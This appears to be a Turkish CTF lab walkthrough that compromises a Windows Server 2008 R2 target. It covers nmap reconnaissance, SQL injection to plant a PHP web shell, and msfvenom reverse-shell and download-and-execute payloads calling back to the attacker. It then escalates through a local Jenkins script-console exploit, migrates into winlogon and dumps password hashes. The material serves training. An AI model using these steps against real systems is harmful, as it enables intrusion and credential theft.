## CTF

- 192.168.1.128 SYSTEM haklarında Meterpreter oturumu elde ediniz.
--edemedi--

**- ÇÖZÜM:**

		=> nmap -A 192.168.1.128 -vv

		PORT     STATE SERVICE      REASON          VERSION
		21/tcp   open  ftp          syn-ack ttl 128 Microsoft ftpd
		| ftp-anon: Anonymous FTP login allowed (FTP code 230)
		|_Can't get directory listing: TIMEOUT
		81/tcp   open  http         syn-ack ttl 128 Microsoft IIS httpd 7.5
		| http-methods: 
		|   Supported Methods: OPTIONS TRACE GET HEAD POST
		|_  Potentially risky methods: TRACE
		|_http-server-header: Microsoft-IIS/7.5
		|_http-title: IIS7
		445/tcp  open  microsoft-ds syn-ack ttl 128 Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
		8181/tcp open  http         syn-ack ttl 128 Apache httpd 2.4.23 ((Win32) PHP/5.6.28)
		| http-methods: 
		|_  Supported Methods: GET HEAD POST OPTIONS
		|_http-server-header: Apache/2.4.23 (Win32) PHP/5.6.28
		|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
		MAC Address: 00:0C:29:0B:18:42 (VMware)
		| smb-os-discovery: 
		|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
		|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
		|   Computer name: WIN-MQAMOOSDNEE
		|   NetBIOS computer name: WIN-MQAMOOSDNEE\x00
		|   Workgroup: WORKGROUP\x00
		|_  System time: 2017-02-14T13:58:46+02:00

		=> dirb http://192.168.1.128:8181
		B> 192.168.1.128:8181/site/
		B> simple dynamic website sql injection site:exploit-db.com

- Websitesine SQL injection ile shell atıyoruz. Bunun için önce dizini bulmamız gerek. HEDEF/site/info.php de _SERVER["DOCUMENT_ROOT"] değişkeni bize verir veya HEDEF/site/page.php şeklinde uygulamaya hata verdirterek dizini öğrenebiliriz.

			B> HEDEF/shell.php?cmd=whoami

- Meterpreter shell'i oluşturmamız gerek.

		=> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<OUR_IP> LPORT=445 -f exe -o /var/www/html/halil.exe
		=> msfvenom -p php/download_exec --payload-options
		=> msfvenom -p php/download_exec URL=<OUR_IP>/halil.exe -f raw -o upload.txt
		
- upload.txt'yi SQL sorgusunu bozmayacak bir sekilde tek satır haline getirmemiz gerekir. Kodu base64'e dönüştüreceğiz. Ardından php'nin eval fonksiyonunu kullanacağız.

		=> msfvenom -p php/download_exec URL=<OUR_IP>/halil.exe -f raw -o upload.txt -e php/base64
- upload.txt'nin başına ve sonuna php taglarını ekle.

			=> msfconsole
			M> use /exploit/multi/handler
			M> set PAYLOAD windows/x64/meterpreter/reverse_tcp
			M> ayarlari yap ve calistir
			B> <HEDEF>payload
			B> <HEDEF>siber.php

**- Hak yükseltme aşaması:** Bu kısımda makine patch'li olduğu için kullanılabilir bir exploiti yok. Aşağıdaki yöntem izlenerek yetki yükseltilebilir.

	Mtr> shell
	S> netstat -ano

- Local'de 8080'i dinleyen bir port var. Eğer local interface'i dinleyen bir process varsa bu process büyük ihtimalle AUTH/SYS (*nix sistemlerde root) olarak çalışıyordur. Port forwarding kullanarak local interface'i kendimize bağlantı isteği atarak görebiliriz.

		Mtr> portfwd add -l 8080 -p 8080 -r 192.168.1.128
		=> nmap -n -sV -Pn 127.0.0.1 -p 8080 -vv 	(Kendi ağımıza yolladığımız isteğe tarama yapıyoruz.)
		B> 127.0.0.1:8080
		Mtr> background
		M> search jenkins
		M> use exploit/multi/http/jenkins_script_console
		M> set RHOST 127.0.0.1
		M> set RPORT 8080
		M> set TARGETURI /
		M> set PAYLOAD windows/meterpreter/reverse_tcp
		M> ayarlari yap ve calistir.
		Mtr> sysinfo
		Mtr> getuid
		Mtr> ps -S winlo
		Mtr> migrate WINLOGON_PID
		Mtr> hashdump
		
